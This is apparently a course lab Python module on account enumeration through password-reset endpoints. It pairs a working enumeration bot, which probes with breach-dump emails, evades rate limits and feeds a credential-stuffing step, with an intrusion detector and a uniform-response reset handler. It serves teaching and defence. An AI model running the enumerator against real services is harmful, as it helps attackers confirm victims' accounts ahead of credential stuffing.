"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Account Enumeration via Password Reset
 Environment: ISOLATED VM LAB ONLY
====================================================

Teaching point (from Document 2 / Castle blog):
  "Credential stuffing + enumeration: Attackers first verify
   active accounts by probing password reset endpoints, then
   launch stuffing attempts only on live users."

Why this matters:
  A naive password-reset endpoint leaks whether an account exists:
    POST /reset-password {"email": "alice@example.com"}
    → "We sent a reset link to that address."   ← EXISTS
    → "No account found for that email."         ← DOES NOT EXIST

  Attackers use this to pre-filter a million-entry breach dump
  down to only the emails registered on THIS service, then run
  credential stuffing only on confirmed accounts. This improves
  hit rate by 10–100x.

  The defense is a timing-safe, uniform response:
    → "If that email is registered, we have sent a link."  (always)

This module has two parts:

1. AccountEnumerationBot (Attack side)
   Probes /reset-password to classify emails as
   EXISTS / NOT_EXISTS / UNKNOWN.

2. EnumerationDetector (Defense/IDS side)
   Detects enumeration campaigns:
   - High volume of /reset-password requests from one IP
   - Unusual ratio of "not found" vs "found" responses
   - Probing known breach-dump email patterns
   Integrated into fake_portal.py and ids_detector.py.

3. SecureResetEndpoint (Defense implementation helper)
   Timing-safe, information-hiding reset handler that returns
   uniform responses regardless of account existence.
"""

import argparse
import hashlib
import json
import os
import random
import sys
import time
import threading
import urllib.request
import urllib.error
from collections import defaultdict, deque
from datetime import datetime
from typing import Optional

DEFAULT_HOST  = "192.168.100.20"
DEFAULT_PORT  = 80
RESET_PATH    = "/reset-password"
BREACH_DUMP   = os.path.join(os.path.dirname(__file__), "breach_dump.txt")


# ══════════════════════════════════════════════════════════════
#  Part 1: ACCOUNT ENUMERATION BOT (Attack side)
# ══════════════════════════════════════════════════════════════

class AccountEnumerationBot:
    """
    Probes the /reset-password endpoint to identify which
    emails from a breach dump are registered on the target.

    Output: two lists
      confirmed_accounts  — emails that exist → feed to cred_stuffing.py
      nonexistent_emails  — emails not on this service → discard

    This is the pre-filtering step described in Document 2.
    """

    # Strings in response bodies that indicate account existence
    EXISTS_SIGNALS = [
        "reset link", "email sent", "check your email",
        "we have sent", "instructions sent", "link has been sent",
    ]
    NOT_EXISTS_SIGNALS = [
        "no account", "not found", "not registered",
        "email address not found", "unknown email",
        "doesn't exist", "does not exist",
    ]

    def __init__(self, host: str, port: int,
                 interval_ms: int = 300,
                 jitter_ms: int = 100):
        self.host        = host
        self.port        = port
        self.interval_ms = interval_ms
        self.jitter_ms   = jitter_ms
        self.confirmed   = []   # accounts confirmed to exist
        self.absent      = []   # accounts confirmed not to exist
        self.unknown     = []   # ambiguous responses
        self.attempts    = 0
        self._stop       = threading.Event()

    def _probe(self, email: str) -> str:
        """
        Returns 'exists', 'not_exists', 'rate_limited', 'unknown', 'error'
        """
        url     = f"http://{self.host}:{self.port}{RESET_PATH}"
        payload = json.dumps({"email": email}).encode()
        req     = urllib.request.Request(url, data=payload, method="POST")
        req.add_header("Content-Type", "application/json")
        req.add_header("User-Agent",
                       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36")
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                body  = resp.read().decode(errors="replace").lower()
                code  = resp.status
                # Check for leaky responses
                for sig in self.EXISTS_SIGNALS:
                    if sig in body:
                        return "exists"
                for sig in self.NOT_EXISTS_SIGNALS:
                    if sig in body:
                        return "not_exists"
                return "unknown"
        except urllib.error.HTTPError as e:
            if e.code == 429:
                return "rate_limited"
            try:
                body = e.read().decode(errors="replace").lower()
                for sig in self.EXISTS_SIGNALS:
                    if sig in body:
                        return "exists"
                for sig in self.NOT_EXISTS_SIGNALS:
                    if sig in body:
                        return "not_exists"
            except Exception:
                pass
            return "unknown"
        except Exception:
            return "error"

    def run(self, emails: list, max_probes: int = None) -> dict:
        """
        Probe each email. Returns summary dict.
        """
        print(f"\n[ENUM] {'='*55}")
        print(f"[ENUM] Account Enumeration via Password Reset")
        print(f"[ENUM] Target: http://{self.host}:{self.port}{RESET_PATH}")
        print(f"[ENUM] Probing {len(emails)} emails from breach dump")
        print(f"[ENUM] Goal: identify which emails are registered")
        print(f"[ENUM]       so credential stuffing targets only real accounts")
        print(f"[ENUM] {'='*55}\n")

        to_probe = emails[:max_probes] if max_probes else emails

        for email in to_probe:
            if self._stop.is_set():
                break

            result = self._probe(email)
            self.attempts += 1
            ts = datetime.now().strftime("%H:%M:%S")

            if result == "exists":
                self.confirmed.append(email)
                print(f"[ENUM] {ts}  ✓ EXISTS        {email}")
            elif result == "not_exists":
                self.absent.append(email)
                if self.attempts % 20 == 0:
                    print(f"[ENUM] {ts}  ✗ not_exists    {email}  "
                          f"[{self.attempts} probed, {len(self.confirmed)} confirmed]")
            elif result == "rate_limited":
                print(f"[ENUM] {ts}  ⚠ RATE-LIMITED  — backing off 5s")
                time.sleep(5)
                self.unknown.append(email)
            elif result == "unknown":
                self.unknown.append(email)
                print(f"[ENUM] {ts}  ? uniform resp  {email}  "
                      f"← Secure endpoint! Cannot enumerate.")
            else:
                print(f"[ENUM] {ts}  ? error         {email}")

            sleep_ms = self.interval_ms + (
                random.randint(-self.jitter_ms, self.jitter_ms)
                if self.jitter_ms > 0 else 0
            )
            time.sleep(max(50, sleep_ms) / 1000.0)

        return self._summary()

    def _summary(self) -> dict:
        total = self.attempts
        print(f"\n[ENUM] {'='*55}")
        print(f"[ENUM] Enumeration complete")
        print(f"[ENUM]   Probed:             {total}")
        print(f"[ENUM]   Confirmed exists:   {len(self.confirmed)}  "
              f"({100*len(self.confirmed)/max(1,total):.1f}%)")
        print(f"[ENUM]   Confirmed absent:   {len(self.absent)}")
        print(f"[ENUM]   Unknown/uniform:    {len(self.unknown)}")

        if self.confirmed:
            print(f"\n[ENUM] Confirmed accounts (feed to cred_stuffing.py):")
            for e in self.confirmed[:10]:
                print(f"[ENUM]   {e}")
            if len(self.confirmed) > 10:
                print(f"[ENUM]   ... and {len(self.confirmed)-10} more")
        else:
            print(f"\n[ENUM] No confirmed accounts — endpoint uses uniform responses")
            print(f"[ENUM] (Secure design: attacker cannot distinguish exists/not-exists)")

        print(f"\n[ENUM] Teaching point:")
        if len(self.unknown) > len(self.confirmed) + len(self.absent):
            print(f"[ENUM]   Secure endpoint returns uniform response → enumeration blocked")
            print(f"[ENUM]   Defender won this round.")
        else:
            print(f"[ENUM]   Leaky endpoint reveals account existence → pre-filter attack works")
            print(f"[ENUM]   Fix: always return 'If registered, we sent a link' uniformly")
        print(f"[ENUM] {'='*55}\n")

        return {
            "total": total,
            "confirmed": self.confirmed,
            "absent": self.absent,
            "unknown": self.unknown,
        }


# ══════════════════════════════════════════════════════════════
#  Part 2: ENUMERATION DETECTOR (IDS / Defense)
# ══════════════════════════════════════════════════════════════

class EnumerationDetector:
    """
    IDS Engine 13: Detects account enumeration campaigns on the
    /reset-password endpoint. Integrated into fake_portal.py.

    Previously unnumbered in the IDS taxonomy; formally assigned
    Engine 13 to complete the Engine 1–14 numbering sequence.
    (Engine 14 = BreachIntelDetector in breach_dump_enricher.py)

    Signals:
      1. High volume of reset requests from one IP in a time window
      2. High ratio of "not found" responses (breach dump pattern)
      3. Sequential or domain-clustered email patterns (bot list)
    """

    ENGINE_ID             = 13
    ENGINE_NAME           = "Engine13/AccountEnumeration"

    RATE_THRESHOLD        = 10    # requests per IP per WINDOW
    NOT_FOUND_RATIO_THRESH = 0.70  # 70% not-found → breach dump
    WINDOW_SEC            = 60.0

    def __init__(self):
        self._lock          = threading.Lock()
        # ip → deque of (timestamp, outcome) where outcome: 'found'|'not_found'
        self._ip_log: dict  = defaultdict(lambda: deque(maxlen=500))
        self._alerts        = 0

    def record(self, src_ip: str, email: str, outcome: str,
               alert_cb=None) -> Optional[str]:
        """
        Record a reset attempt.
        outcome: 'found' | 'not_found' | 'rate_limited'
        Returns an alert string if a threshold is crossed, else None.
        """
        now = time.time()
        with self._lock:
            self._ip_log[src_ip].append((now, outcome, email))

        return self._check(src_ip, alert_cb)

    def _check(self, src_ip: str, alert_cb=None) -> Optional[str]:
        now    = time.time()
        cutoff = now - self.WINDOW_SEC

        with self._lock:
            recent = [
                (ts, oc, em) for ts, oc, em in self._ip_log.get(src_ip, [])
                if ts > cutoff
            ]

        if not recent:
            return None

        n          = len(recent)
        not_found  = sum(1 for _, oc, _ in recent if oc == "not_found")
        nf_ratio   = not_found / n if n else 0

        alert = None

        if n >= self.RATE_THRESHOLD:
            alert = (
                f"ACCOUNT ENUMERATION detected from {src_ip}\n"
                f"  {n} password-reset probes in {self.WINDOW_SEC:.0f}s "
                f"(threshold: {self.RATE_THRESHOLD})\n"
                f"  Not-found ratio: {nf_ratio:.0%} "
                f"({'breach dump pattern' if nf_ratio > self.NOT_FOUND_RATIO_THRESH else 'mixed'})\n"
                f"  Technique: pre-filtering breach dump to confirmed accounts\n"
                f"  MITRE: T1589.002 (Email Address Enumeration)"
            )

        elif (n >= 5 and nf_ratio >= self.NOT_FOUND_RATIO_THRESH):
            alert = (
                f"ENUMERATION PATTERN from {src_ip}\n"
                f"  {nf_ratio:.0%} of {n} reset probes hit non-existent accounts\n"
                f"  Characteristic of breach-dump pre-filtering"
            )

        if alert and alert_cb:
            self._alerts += 1
            alert_cb(self.ENGINE_NAME, "HIGH", alert)

        return alert

    def get_stats(self) -> dict:
        now    = time.time()
        cutoff = now - self.WINDOW_SEC
        result = {}
        with self._lock:
            for ip, entries in self._ip_log.items():
                recent = [(ts, oc, em) for ts, oc, em in entries if ts > cutoff]
                if recent:
                    result[ip] = {
                        "n":          len(recent),
                        "not_found":  sum(1 for _, oc, _ in recent
                                          if oc == "not_found"),
                        "found":      sum(1 for _, oc, _ in recent
                                          if oc == "found"),
                    }
        return result


# ══════════════════════════════════════════════════════════════
#  Part 3: SECURE RESET ENDPOINT HELPER
# ══════════════════════════════════════════════════════════════

class SecurePasswordReset:
    """
    Timing-safe, information-hiding password reset implementation.

    Defense against enumeration:
      - Always returns the SAME response body regardless of
        whether the email exists.
      - Adds a random 0.1–0.5s sleep to prevent timing side-channel
        (real account lookups take non-zero time; faking it equalizes).
      - Sends real reset token via "email" (logs it in lab context).
      - Rate-limits per IP (via EnumerationDetector).

    Integrated by fake_portal.py's /reset-password handler.
    """

    UNIFORM_RESPONSE = {
        "status":  "pending",
        "message": ("If that email address is registered, "
                    "we have sent a password reset link to it. "
                    "Please check your inbox."),
    }

    def __init__(self, known_emails: set = None):
        self.known_emails = known_emails or set()
        self._tokens: dict = {}   # email → (token, expiry)
        self._lock = threading.Lock()

    def handle(self, email: str) -> tuple:
        """
        Process a password reset request.
        Returns (http_status, response_body_dict).

        Timing is equalized: always sleeps a random amount
        so an observer cannot distinguish exists vs not-exists
        by response time.
        """
        # Equalize timing — DB lookup takes ~0–50ms; fake it for non-existent
        time.sleep(random.uniform(0.10, 0.45))

        exists = email.lower() in {e.lower() for e in self.known_emails}

        if exists:
            # Generate a real token (logged but not emailed in lab context)
            token  = hashlib.sha256(
                (email + str(time.time()) + os.urandom(8).hex()).encode()
            ).hexdigest()[:32]
            expiry = time.time() + 3600   # 1-hour TTL
            with self._lock:
                self._tokens[email.lower()] = (token, expiry)
            # In a real system: send token via email
            print(f"[RESET] Token generated for {email}: {token} "
                  f"(lab: not actually emailed)")

        # ALWAYS return the same uniform response — no information leak
        return 200, dict(self.UNIFORM_RESPONSE)

    def verify_token(self, email: str, token: str) -> bool:
        """Verify a submitted reset token."""
        with self._lock:
            entry = self._tokens.get(email.lower())
        if not entry:
            return False
        stored_token, expiry = entry
        if time.time() > expiry:
            return False
        return hmac.compare_digest(stored_token, token)


# ── Entry point ───────────────────────────────────────────────

def _load_emails(path: str) -> list:
    emails = []
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    emails.append(line.split(":", 1)[0].strip())
    except FileNotFoundError:
        for i in range(30):
            emails.append(f"user{i:04d}@example.com")
    return emails


if __name__ == "__main__":
    import hmac as _hmac_mod
    hmac = _hmac_mod

    parser = argparse.ArgumentParser(
        description="Account Enumeration Simulator — AUA Research Lab"
    )
    parser.add_argument("--host",   default=DEFAULT_HOST)
    parser.add_argument("--port",   type=int, default=DEFAULT_PORT)
    parser.add_argument("--max",    type=int, default=50,
                        help="Max emails to probe (default: 50)")
    parser.add_argument("--interval", type=int, default=300,
                        help="Interval ms between probes (default: 300)")
    parser.add_argument("--dump",   default=BREACH_DUMP)
    args = parser.parse_args()

    print("=" * 60)
    print(" Account Enumeration Simulator — AUA Botnet Research Lab")
    print(" ISOLATED VM ONLY — targets fake_portal.py /reset-password")
    print("=" * 60)

    emails = _load_emails(args.dump)
    print(f"[ENUM] Loaded {len(emails)} emails from {args.dump}")

    bot = AccountEnumerationBot(
        host=args.host,
        port=args.port,
        interval_ms=args.interval,
        jitter_ms=100,
    )
    results = bot.run(emails, max_probes=args.max)

    if results["confirmed"]:
        print("\n[ENUM] Next step (if endpoint is leaky):")
        print("[ENUM]   python3 cred_stuffing.py --mode bot "
              "--emails confirmed_list.txt")
        print("[ENUM]   This targets ONLY confirmed accounts → much higher hit rate")